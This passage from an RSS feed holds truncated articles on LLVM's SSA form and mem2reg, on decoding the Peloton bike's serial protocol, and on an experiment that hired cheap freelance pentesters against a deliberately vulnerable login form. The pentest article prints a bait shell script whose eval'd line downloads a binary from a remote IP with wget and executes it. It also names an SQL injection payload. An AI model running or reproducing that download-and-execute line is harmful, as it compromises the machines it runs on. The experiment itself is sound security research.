  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%2</span><span>,</span> <span>i32</span> <span>%3</span><span>,</span> <span>i32</span> <span>420</span><span>)</span>
  <span>store</span> <span>i32</span> <span>%call1</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>%4</span> <span>=</span> <span>load</span> <span>i32</span><span>,</span> <span>i32</span><span>*</span> <span>%fd</span><span>,</span> <span>align</span> <span>4</span>
  <span>ret</span> <span>i32</span> <span>%4</span>
<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool.not</span> <span>=</span> <span>icmp</span> <span>eq</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms">https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</a></em></p>]]>
            </description>
            <link>https://blog.yossarian.net/2020/10/23/Understanding-static-single-assignment-forms</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869227</guid>
            <pubDate>Fri, 23 Oct 2020 13:27:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Penetration testing and low-cost freelancing]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24869219">thread link</a>) | @sophron
<br/>
October 23, 2020 | https://sophron.github.io/lowcost-freelancing-pentest/ | <a href="https://web.archive.org/web/*/https://sophron.github.io/lowcost-freelancing-pentest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
    <div id="content">


<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

<table>
<thead>
  <tr>
    <th>Tester #</th>
    <th>Cost</th>
    <th>Bug 1</th>
    <th>Bug 2</th>
    <th>Reported vuln correctly</th>
    <th>Did not run malicious binary</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>$20</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>2</td>
    <td>$30</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>3</td>
    <td>$35</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>4</td>
    <td>$40</td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>5</td>
    <td>$50</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
  </tr>
  <tr>
    <td>6</td>
    <td>$100</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>7</td>
    <td>$400</td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
</tbody>
</table>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sophron.github.io/lowcost-freelancing-pentest/">https://sophron.github.io/lowcost-freelancing-pentest/</a></em></p>]]>
            </description>
            <link>https://sophron.github.io/lowcost-freelancing-pentest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869219</guid>
            <pubDate>Fri, 23 Oct 2020 13:26:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decoding the Peloton: From Voltages to “Cadence, Output, and Resistance”]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24869207">thread link</a>) | @albertwang
<br/>
October 23, 2020 | https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/ | <a href="https://web.archive.org/web/*/https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><strong><span>TL</span>;<span>DR</span></strong> - I’ve decoded (most of) the protocol that the Peloton bike uses to
communicate with its head unit tablet and built a device, the PeloMon, that takes that
data during a ride, without interfering with the Peloton software, to
broadcast it over Bluetooth <span>LE</span> to whatever devices you’d like — a watch, Zwift,
Wahoo, whatever. Stick around for logic analyzer traces, hardware diagrams,
cursing at Bluetooth, and some nice&nbsp;interfaces.</p>


<p>First in a series. See the <a href="https://github.com/ihaque/pelomon">project GitHub</a>, to be updated through the&nbsp;series.</p>
<ul>
<li><a href="https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/">Part I: Decoding the&nbsp;Peloton</a></li>
<li>Part <span>II</span>: Hardware Selection for the PeloMon&nbsp;(upcoming)</li>
<li>Part <span>III</span>: Software, or why Bluetooth <span>LE</span> has the <em>worst</em> specification docs&nbsp;(upcoming)</li>
<li>Part <span>IV</span>: The PeloMon completed&nbsp;(upcoming) </li>
</ul>
<h2 id="table-of-contents"><a href="#table-of-contents">Table of&nbsp;Contents</a></h2>
<ul>
<li><strong><a href="#intro-to-the-pelomon-project">Intro</a></strong></li>
<li><strong><a href="#the-physical-layer-how-does-the-bike-talk-to-the-tablet">Physical Layer</a></strong> (<a href="#hardware-used">Hardware Used</a>, <a href="#mapping-the-available-signals">Mapping Signals</a>, <a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Wire Protocol</a>)</li>
<li><strong><a href="#data-encoding-what-are-the-head-unit-and-bike-saying-to-each-other">Data Encoding</a></strong> (<a href="#basic-packet-structure">Packet Structure</a>, <a href="#decoding-cadence-rpm-power-and-almost-resistance">Cadence and Power</a>, <a href="#a-detour-what-happens-when-you-boot-up-the-bike">Boot Sequence</a>, <a href="#decoding-resistance-for-real-this-time">Resistance</a>)</li>
<li><strong><a href="#conclusion">Conclusion</a></strong> (<a href="#pinouts">Pinouts</a>, <a href="#protocol-description">Protocol Description</a>, <a href="#open-questions">Open Questions</a>)</li>
</ul>

<p>We have a Peloton at home. Originally, I was skeptical, but then I found
trainers I like and it’s fun to ride with friends. And really takes the edge
off all-day Zoom meetings to ride during a meeting with the camera turned&nbsp;off.</p>
<p>But, being the guy that I am, I’ve been curious about how the head unit —
which runs a lightly skinned Android — was collecting stats
from the actual bike. I was also a bit annoyed that though the Peloton software
will happily read data from an <span>HR</span> sensor, and will upload your ride data to
Strava, there was no way for it to <em>broadcast</em> data about a ride to a local
fitness appliance — which meant that although I could track the fact that I
was doing an “indoor bike” ride on my Garmin watch, the watch would see a 0
mile ride because it got no bike&nbsp;data.</p>
<p>Then a couple months ago, I came across
<a href="https://ptx2.net/posts/unbricking-a-bike-with-a-raspberry-pi/">this blog post</a>
in which someone on the Internet was able to hook up their (bricked) Flywheel
bike to Zwift using a Raspberry Pi to decode the bike sensor data and broadcast
it over Bluetooth — and I was inspired to finally give this project a shot.
What should we call a device broadcasting stats from the Peloton, monitoring it
if you will? How about&nbsp;“PeloMon”?</p>
<p>Let’s get down to&nbsp;it.</p>

<h2 id="hardware-used"><a href="#hardware-used">Hardware&nbsp;used</a></h2>
<p>Any physical layer work is going to require actual hardware!
I’ll provide links to all of the hardware involved in
the project in case you’d like to follow along. I bought from a mix of Amazon
and Adafruit; note that the Amazon links are affiliate links so if you end
up buying there I’ll get a small referral&nbsp;bonus.</p>
<table>
<tbody><tr><th>Part name</th><th>Links</th><th>Price at time of writing</th></tr>
<tr><td><span>TRRS</span> breakout board</td>
    <td><a href="https://amzn.to/3dsGuYt">Amazon</a></td>
    <td>$6.98 (qty 3)</td></tr>
<tr><td><span>USB</span> logic analyzer 24MHz 8ch</td>
    <td><a href="https://amzn.to/319svlj">Amazon</a></td>
    <td>$12.49</td></tr>
<tr><td>6” stereo headphone splitter cable</td>
    <td><a href="https://amzn.to/341FG9D">Amazon</a></td>
    <td>$4.91</td></tr>
<tr><td>3ft aux cable</td>
    <td><a href="https://amzn.to/2IzVhFi">Amazon</a></td>
    <td>$3.99</td></tr>
<tr><td>2.1mm <span>DC</span> barrel jack splitter</td>
    <td><a href="https://www.adafruit.com/product/1351">Adafruit</a></td>
    <td>$2.95</td></tr>

</tbody></table>

<h2 id="mapping-the-available-signals"><a href="#mapping-the-available-signals">Mapping the available&nbsp;signals</a></h2>
<p>There are only two cables that plug into the tablet: a barrel jack carrying
<span>DC</span> power @ 12V (coming from the power brick), and a <span>TRRS</span> connector —
think “stereo aux cable”. So the data is clearly coming in on the latter.
Since I only wanted to observe the traffic between the <span>HU</span> and the bike,
not interrupt it, I used a headphone splitter cable to split the cable from the bike with an extra jack, and connected an aux cable from that extra jack
to the breakout. Such a connection might disrupt some high-speed communications
protocols, but my guess was that a) there wasn’t going to be that much traffic
to require anything fancy, b) nothing fast would be running over 3.5mm <span>TRRS</span>, and
c) this interface would be engineered with pretty wide tolerances for stability 
in a home environment. (Spoiler alert: all of these were&nbsp;true.)</p>
<p>The first step was to identify the pinout from the jack as best
as possible. Probing the leads with a <span>DMM</span> with the bike active showed that
Ring2 was at ground (0V with respect to the power supply’s ground)
with -5.5-6V between tip or ring1 and ground. Sleeve also appears to be
at ground, but it and Ring2 may not quite be the same (more on this later).
The negative voltages with respect
to ground are a pretty strong sign that we’re going to see <span>RS</span>-232&nbsp;signaling.</p>
<h2 id="decoding-the-wire-protocol-with-a-logic-analyzer"><a href="#decoding-the-wire-protocol-with-a-logic-analyzer">Decoding the wire protocol with a logic&nbsp;analyzer</a></h2>
<p>(If you’d like to load a PulseView trace to see the data for yourself, one session
file from a test ride is located in <code>peloton_decoding/resistance-stepped-10s.sr</code>
in <a href="https://github.com/ihaque/pelomon">the PeloMon GitHub repository</a>.)</p>
<p>Normally I’d wire up the breakout and hack something together on the Arduino
I have sitting around, but it turns out that logic analyzers have gotten
<em>really really cheap</em> so I splurged on a $12.50 one and thought I’d give it
a whirl — turned out to be a great idea that made it <span>WAY</span> easier to decode
the signals. With complete abandon regarding ground isolation and the voltage
tolerances of the <span>LA</span> (is it supposed to be able to handle negative voltage?),
I hooked it up to see what I’d get. These cheapo LAs emulate a Saleae Logic
analyzer and work fine in the open-source <a href="https://sigrok.org/wiki/PulseView">PulseView</a>&nbsp;software.</p>
<p><img alt="Hooking up the LA with D0 on tip, D4 on ring1, D5 on sleeve, and GND on ring2" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-4ring1-5sleeve-gndring2.png">
</p><center><strong>Hooking up the <span>LA</span> with D0 on tip, D4 on ring1, D5 on sleeve, and <span>GND</span> on ring2</strong></center>
<p><img alt="D0 on tip, D2 on ring1, D4 on ring2, and GND on sleeve" src="https://ihaque.org/static/img/2020/10/20201015-pinout-0tip-2ring1-4ring2-gndsleeve.png">
</p><center><strong>D0 on tip, D2 on ring1, D4 on ring2, and <span>GND</span> on sleeve</strong></center>
<p>There’s pretty clearly serial signaling going on over these wires! One
party seems to be sending requests on Tip every 100ms, and the other
party responds about a millisecond later on Ring1. While it wasn’t obvious
from the <span>DMM</span> whether signaling <span>GND</span> should be on Ring2 or Sleeve, from the <span>LA</span>
traces, it looks like there is less glitching on the response line if Ring2 is
used as <span>GND</span> - so we’ll do that. The narrow pulses are probably single bits,
so sampling at a high rate (a few hundred kHz) lets us measure the bit
rate as&nbsp;19200bps:</p>
<p><img alt="Counting samples in the LA shows a 19.2kHz signal" src="https://ihaque.org/static/img/2020/10/20201015-pinout-19200bps.png">
</p><center><strong>Counting samples in the <span>LA</span> shows a 19.2kHz signal</strong></center>
<p>PulseView also lets you add protocol decoders to particular wires. I put a <span>UART</span>
decoder on with D0 as “<span>RX</span>” and D4 as “<span>TX</span>”, and saw data, but with a ton of
low-level serial protocol errors. UARTs invert the signal going out on the wire
with the expectation that there will be another <span>UART</span> at the other end to
re-invert. Since we don’t have that second <span>UART</span>, we have to turn the “Invert <span>RX</span>”
and “Invert <span>TX</span>” options on in PulseView, and then we see clean data! I also
experimented with other serial options (data, parity, and stop bits), but the
first guess of 8N1 turned out&nbsp;correct.</p>
<p><img alt="Without inversion enabled, we see framing errors and break conditions" src="https://ihaque.org/static/img/2020/10/20201015-missing-inversion.png">
</p><center><strong>Without inversion enabled, we see framing errors and break conditions</strong></center>
<p><img alt="Turning on the inversion in software, we see data with no serial errors!" src="https://ihaque.org/static/img/2020/10/20201015-fixed-inversion.png">
</p><center><strong>Turning on the inversion in software, we see data with no serial errors!</strong></center>
<p>Following the data streams, we see that the data stream on the
Tip wire during a ride always consists of one of three different four-byte
packets, repeated round-robin every 100ms, with the responses on Ring1 to these
requests being longer, different in length depending on the request type, and
variable in content.
It seems likely then that the Tip shows us signaling from the head unit to the
bike, and Ring1 is the bike responding to the head unit with information
about variables like current speed, resistance, or power&nbsp;output.</p>
<p><strong>Thus, we’ve worked out the physical layer protocol for the Peloton
communications: <span>RS</span>-232 at 5.5V and 19200bps 8N1 encoding, with <span>HU</span>-to-bike
communications on Tip, bike-to-<span>HU</span> on Ring1, <span>GND</span> on Ring2, and something
ground-like on&nbsp;Sleeve.</strong></p>

<p>To investigate the encoding between the head unit and the bike, I used the
logic analyzer to capture a trace of the communications during a ride. (Shoutout
to Ben Alldis and his Ministry of Sound ride series!)
The data dump and scripts are available in the GitHub repository for this project
at https://github.com/ihaque/pelomon/, in the <code>peloton_decoding</code> subdirectory.)</p>
<h2 id="basic-packet-structure"><a href="#basic-packet-structure">Basic packet&nbsp;structure</a></h2>
<p>(To follow along, run <code>peloton_decoding/decoder_plots.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>During a ride, about every 100ms (100.66-100.8ms) the <span>HU</span> sends a request
to the bike, and the bike responds about 300us (i.e., 0.3ms) from the end
of the <span>HU</span>’s request. The <span>HU</span> sends three different request packets round robin.
Each request type has a different response length from the&nbsp;bike:</p>
<table> 
<tbody><tr><th><span>HU</span> Request</th><th>Bike Response Length</th><th>Example Bike Response</th></tr>
<tr><td><tt>F5 41 36 F6</tt></td><td>8 bytes</td><td><tt>F1 41 03 30 30 30 C5 F6</tt></td></tr>
<tr><td><tt>F5 44 39 F6</tt></td><td>10 bytes</td><td><tt>F1 44 05 30 30 30 30 30 2A F6</tt></td></tr>
<tr><td><tt>F5 4A 3F F6</tt></td><td>9 bytes</td><td><tt>F1 4A 04 38 36 36 30 13 F6</tt></td></tr>
</tbody></table>

<p>A few things are evident from simple inspection of the&nbsp;bytes:</p>
<ul>
<li>The first byte is a header - seems to be F5 from the <span>HU</span> and F1 from the&nbsp;bike.</li>
<li>All packets end in&nbsp;F6.</li>
<li>The second byte that the <span>HU</span> sends seems to be a request type, and is mirrored in the second byte in the bike’s&nbsp;response.</li>
<li>The third byte of the bike response is the length of the full packet minus 5 — probably indicates the length of the data payload following&nbsp;it.</li>
<li>Serial packets often carry a checksum, and here the second-to-last byte from either the <span>HU</span> or the bike seems to be that: it’s the sum (modulo 256) of all the bytes preceding&nbsp;it.</li>
</ul>
<p>Thus, the packet format seems to&nbsp;be:</p>
<ul>
<li><span>HU</span>: <code>F5 [request type] [checksum] F6</code></li>
<li>Bike: <code>F1 [request type] [payload length] [response bytes 1-n] [checksum] F6</code></li>
</ul>
<p>We can now throw together a quick plot of each response byte to look for&nbsp;patterns.</p>
<p><img alt="Bytewise plot of Peloton response data for common request packets during part of a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-bytewise.png">
</p><center><strong>Bytewise plot of Peloton response data for common request packets during part of a ride</strong></center>
<p>It appears that every byte ranges from 0x30 to 0x39 — which is exactly the
<span>ASCII</span> range for decimal digits 0 through 9. Furthermore, the earlier bytes in
each packet appear to vary more quickly than the later ones through a ride,
suggesting that the least-significant digit comes first. <strong>The Peloton bike
is encoding its responses as little-endian <span>ASCII</span> digits.</strong> It’s easy enough
to dump a plot of these values per response type now that we know the&nbsp;encoding:</p>
<p><img alt="Decoded values sent by bike to head unit during a ride" src="https://ihaque.org/static/img/2020/10/20201015-peloton-ascii.png">
</p><center><strong>Decoded values sent by bike to head unit during a ride</strong></center>
<h2 id="decoding-cadence-rpm-power-and-almost-resistance"><a href="#decoding-cadence-rpm-power-and-almost-resistance">Decoding cadence (<span>RPM</span>), power, and (almost)&nbsp;resistance</a></h2>
<p>(To follow along, run <code>peloton_decoding/decode_resistance.py</code> from the
<a href="https://github.com/ihaque/pelomon">PeloMon Github repository</a>.)</p>
<p>Glancing at these graphs it’s pretty clear that we have ride data of the Peloton
trifecta — cadence, power, and resistance — with a couple weird things thrown in
for flavor. Comparing to the Peloton ride stats, <strong>request type 0x41 seems to directly
return cadence in rpm and request type 0x44 returns 10 times power in watts (i.e.,</strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/">https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/</a></em></p>]]>
            </description>
            <link>https://ihaque.org/posts/2020/10/15/pelomon-part-i-decoding-peloton/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869207</guid>
            <pubDate>Fri, 23 Oct 2020 13:24:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Plausible Analytics Isn't GDPR Compliant]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24868012">thread link</a>) | @ramboram
<br/>
